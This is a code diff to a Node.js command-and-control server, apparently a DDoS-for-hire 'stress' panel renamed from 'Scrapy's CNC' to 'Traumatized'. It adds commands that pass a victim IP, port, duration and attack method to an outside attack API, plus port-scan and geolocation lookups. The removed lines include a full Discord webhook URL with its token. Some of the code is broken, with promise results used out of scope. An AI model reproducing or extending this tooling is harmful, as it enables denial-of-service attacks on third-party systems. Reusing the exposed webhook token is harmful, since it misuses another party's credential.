@@ -23,7 +23,7 @@ server.listen(port, function() {
 
 server.on('connection', function(socket) {
     set_title("Welcome To Scrapy's CNC!", socket);
-    socket.write("Scrapy's CNC\r\n")
+    socket.write("Traumatized\r\n")
     
     console.log("A new connection has been established");
     var socket_port = socket.remotePort;
@@ -36,6 +36,10 @@ server.on('connection', function(socket) {
         let cleanSTR = chunk.toString().replace(/(\r\n|\n|\r)/gm,"");
 
         set_title("Scrapy's CNC! | APIs: 4", socket);
+
+        /*
+        Command handler
+        */
         if(cleanSTR.includes(" ") == true) {
             let split = cleanSTR.split(" ");
             let count = 0;
@@ -49,10 +53,38 @@ server.on('connection', function(socket) {
             config.CurrentCMD.Cmd = cleanSTR;
             config.CurrentCMD.fullcmd = cleanSTR;
         }
+
+        /*
+        Main Functions
+        */
         
         if(crud.isSignedIn(socket_ip) == true) {
             if(cleanSTR.startsWith("testing")) {
                 socket.write("Testing\r\n" + config.hostname);
+            } else if(cleanSTR.startsWith("methods")) {
+                f('https://scrapy.tech/methods.txt').then(res => res.text());
+                socket.write(res + config.hostname);
+            } else if(cleanSTR.startsWith("geo")) {
+                ip = config.CurrentCMD.arg[1];
+                f('https://scrapy.tech/tools/?action=geoip&q='+ip).then(res => res.text())
+                socket.write(res + config.hostname)
+            } else if(cleanSTR.startsWith("pscan")) {
+                ip = config.CurrentCMD.arg[1]
+                f('https://scrapy.tech/tools/?action=pscan&q='+ip).then(res => res.text())
+                socket.write(res + config.hostname)
+            } else if(cleanSTR.startsWith("stress")) {
+                ip = config.CurrentCMD.arg[1]
+                port = config.CurrentCMD.arg[2]
+                time = config.CurrentCMD.arg[3]
+                method = config.CurrentCMD.arg[4]
+                f('https://api.com/api.php?key=key&host='+ip+"&port="+port+"&time="+time+"&method="+method)
+            } else if(cleanSTR.startsWith("exit")) {
+                socket.write("Closing Traumatized.")
+                socket.write(config.Colors.Clear)
+                socket.write("Closing Traumatized..")
+                socket.write(config.Colors.Clear)
+                socket.write("Closing Traumatized...")
+                socket.close()
             } else {
                 socket.write("[x] Command not found!\r\n" + config.hostname);
             }
@@ -80,23 +112,3 @@ server.on('connection', function(socket) {
         console.log("[NODEJS SERVER ERROR(IGNORE)]: " + err + "\r\n");
     });
 });
-
-function set_title(string, socket)
-{
-    socket.write("\033]0;" + string + "\007")
-}
-
-// async function support(subject, reason) {
-//     var webhook = "https://discord.com/api/webhooks/800156262519144490/uvVbr1Sv79FeAyKGnx43VCbxijIE_09DuJr3d5iMrkJUOFUbURCQJ0H7LqPpRoUB4GP5";
-//     const embed = new Discord.MessageEmbed()
-//         .setColor(000000)
-//         .setTitle('Scrapys CNC Support Ticket')
-//         .setDescription('**Subject:** '+subject+"\n**Question:** "+reason)
-//         .setImage('https://64.media.tumblr.com/97985a52a131fb9c6e5d9e69f0761ae9/tumblr_oakqnqGPDy1toufq9o1_500.gif')
-//         .setFooter('Scrapy CNC')
-//     await webhook.send('[CNC Support Ticket]', {
-//         username: 'Scrapy CNC',
-//         avatarURL: 'https://64.media.tumblr.com/97985a52a131fb9c6e5d9e69f0761ae9/tumblr_oakqnqGPDy1toufq9o1_500.gif',
-//         embeds: [embed]
-//     })
-// }
